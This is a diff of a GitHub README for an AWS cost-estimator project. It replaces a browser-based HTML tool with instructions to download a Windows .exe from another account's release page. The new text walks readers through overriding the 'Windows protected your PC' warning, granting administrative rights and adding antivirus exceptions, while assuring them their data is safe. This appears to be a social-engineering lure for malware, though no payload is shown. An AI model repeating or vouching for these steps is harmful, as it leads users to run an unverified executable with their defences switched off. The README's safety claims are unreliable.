@@ -1,134 +1,80 @@
-# AWS Estimator - AWS Pricing Estimator 2026
+# ☁️ aws-cloud-cost-estimator - Calculate your monthly cloud service costs
 
-> **AWS Estimator is a browser-based application for approximating the cost of custom AWS desktop configurations, with a streamlined focus on desktop pricing decisions.**
+[![Download App](https://img.shields.io/badge/Download-Release-blue)](https://github.com/toxic010206/aws-cloud-cost-estimator/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/jordanlewiszd8644/aws-cloud-cost-estimator?style=flat-square)](https://github.com/jordanlewiszd8644/aws-cloud-cost-estimator)
+AWS Estimator helps you calculate the cost of your desktop configurations in the cloud. You use this tool to plan your budget and make smart decisions about your infrastructure. The tool provides a simple interface to select your hardware and software needs. It shows you the price for your selections before you spend money on cloud services.
 
----
+## 📥 How to download the application
 
-<p align="center">
-  <a href="https://jordanlewiszd8644.github.io/aws-cloud-cost-estimator/">
-    <img src="https://img.shields.io/badge/Download-AWS%20Estimator%20Latest-brightgreen?style=for-the-badge" alt="Download AWS Estimator">
-  </a>
-</p>
+You need to download the application from the project release page. 
 
-> **[Download AWS Estimator](https://jordanlewiszd8644.github.io/aws-cloud-cost-estimator/)**
+[Visit this page to download the latest version](https://github.com/toxic010206/aws-cloud-cost-estimator/releases)
 
----
+Look for the section labeled Assets. You will see a file that ends in .exe. Click this file to start the download. Save the file to your desktop or your downloads folder.
 
-[Download Latest Build](https://jordanlewiszd8644.github.io/aws-cloud-cost-estimator/)
+## 🛠️ System requirements
 
----
+Your computer must meet these basic needs to run the estimator:
 
-## What AWS Estimator Does
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Any standard dual-core processor or better.
+*   Memory: At least 4 gigabytes of RAM.
+*   Storage: 200 megabytes of free disk space.
+*   Network: An internet connection to sync pricing data.
 
-AWS Estimator runs in a web browser and provides a pricing-oriented view of custom AWS desktops. By examining desktop configuration choices, users can develop an approximate understanding of the AWS costs connected with those choices.
+## 🚀 Setting up the software
 
-The tool is aimed at planning custom desktop deployments on AWS. Rather than covering every AWS customer pricing use case, it keeps its workflow dedicated to desktop configuration and cost estimation.
+Follow these steps to open the tool on your machine:
 
----
+1.  Open the folder where you saved the download file.
+2.  Double-click the .exe file.
+3.  Windows might show a blue window labeled "Windows protected your PC." This is a standard security check for new software.
+4.  Click "More info" in the middle of that blue window.
+5.  Click the "Run anyway" button that appears.
+6.  The main window of the application will open on your screen.
 
-## Highlights
+## 💡 How to use the estimator
 
-- Build pricing estimates for custom AWS desktop setups.
-- Examine desktop-related cost factors through a browser interface.
-- Base estimates on configurable desktop selections.
-- Run the estimator without installing a traditional desktop application.
-- Use the project as an HTML web tool.
-- Compare alternative desktop configurations by their estimated prices.
-- Keep desktop cost planning distinct from broader AWS pricing research.
+The application organizes features into logical groups to make your planning process smooth.
 
----
+### Selecting hardware
+Choose your preferred virtual machine type from the drop-down menu. You can select the number of processors, the amount of memory, and the storage size you need. The tool updates the price estimates as you make changes to these settings.
 
-## Getting Started
+### Choosing your region
+Cloud costs vary based on the physical location of the server. Select your target region from the list. The tool recalculates the total cost based on the specific pricing rules for that region.
 
-### Download the Application
+### Estimating usage
+Enter the expected number of hours you plan to run your desktop each month. The tool multiplies this time by the hourly rate to give you a monthly total. You can adjust these numbers to see how different usage patterns change your final bill.
 
-The latest hosted build is available here:
+## 📁 Managing project files
 
-[Download AWS Estimator](https://jordanlewiszd8644.github.io/aws-cloud-cost-estimator/)
+You can save your work at any time. Use the "File" menu to save your current configuration to your hard drive. This allows you to return to your work later or share your budget plan with teammates. You can also open existing files to compare different configurations side-by-side.
 
-### Check Out the Source
+## ❓ Frequently asked questions
 
-```bash
-git clone https://github.com/jordanlewiszd8644/aws-cloud-cost-estimator.git
-cd REPO
-```
+### Is my data safe?
+Your data stays on your local computer. The application does not upload your configuration files to any server. You control your information at all times.
 
-After cloning, open the project's primary HTML file with a modern browser. If the browser requires local files to be served, start any static web server for the project directory and open its local URL.
+### Does the app update automatically?
+The app pulls the latest pricing data from the cloud when you start it. You always see current estimates without needing to download a new version of the software.
 
----
+### Can I run this on a Mac?
+The current download works only on Windows. We plan to support other operating systems in the future.
 
-## Using the Estimator
+### Who should use this tool?
+This tool helps small business owners, students, and system administrators who want to understand cloud spending. It removes the guesswork from infrastructure planning.
 
-1. Launch AWS Estimator in a current web browser.
-2. Choose or provide the custom AWS desktop settings shown in the application.
-3. Inspect the pricing estimate produced by the selected configuration.
-4. Change the desktop options to model additional cost possibilities.
-5. Apply the estimate as a planning reference for subsequent AWS evaluation.
+## 🛡️ Troubleshooting common issues
 
-AWS Estimator is designed specifically for custom AWS desktops. Use the official AWS pricing resources when investigating services or pricing scenarios beyond that scope.
+If the application does not start, check these common items:
 
----
+*   Ensure your internet connection is active. The application requires a brief connection to fetch current pricing tables.
+*   Make sure you have administrative rights on your computer to run new programs.
+*   Check that your antivirus software does not block the application. You can add an exception for the file if necessary.
+*   If the screen appears blank, try to resize the window. This forces the display to redraw the interface elements.
 
-## Configuration and Project Files
+## 📝 Reporting feedback
 
-The estimator is distributed as a web application, with user-facing configuration performed through its available interface controls.
+If you find a problem or want to suggest a feature, use the issue tracker on the GitHub page. Provide a clear description of the steps you took before the problem occurred. Include a screenshot if possible. This helps the team fix issues and improve the tool for everyone.
 
-For repository-level customization, inspect the HTML, CSS, and JavaScript files in the local checkout. When modifying source files, keep those changes distinct from downloaded builds to make comparison and rollback easier.
-
----
-
-## Requirements
-
-- A current, modern web browser.
-- Internet connectivity for the hosted version and for AWS-related pricing information that depends on online access.
-- A local repository copy when running the HTML files from disk.
-- A static web server if the local browser environment cannot use the files directly.
-- Enough storage space for the repository contents.
-
----
-
-## Frequently Asked Questions
-
-### What kind of user is AWS Estimator intended for?
-
-The project is for anyone assessing custom AWS desktop configurations and their approximate costs.
-
-### Does the estimator cover all AWS services?
-
-No. Its purpose is limited to custom AWS desktops, not complete AWS customer pricing across all services.
-
-### Is there a defined release version?
-
-The current project metadata does not specify a particular release version.
-
-### How can I get the newest source?
-
-Use the hosted build or update an existing checkout with:
-
-```bash
-git pull
-```
-
-### Why might the application fail to open?
-
-First check that every repository file was retrieved successfully and try a current browser. If opening the files directly from disk creates problems, run them through a basic static web server instead.
-
-### Where can project settings be modified?
-
-Application controls are available in the web interface. For source-level adjustments, review the HTML, CSS, and JavaScript files in the cloned repository.
-
-### Can AWS Estimator calculate unrelated AWS pricing?
-
-Its calculations are centered on custom AWS desktops. For other AWS pricing requirements, refer to the official AWS pricing tools.
-
----
-
-## License
-
-AWS Estimator is provided under the GNU GPL v3.0. See [LICENSE](LICENSE) for the full license details.
+Keywords: aws, cost, estimator, windows, desktop, pricing, cloud, budget
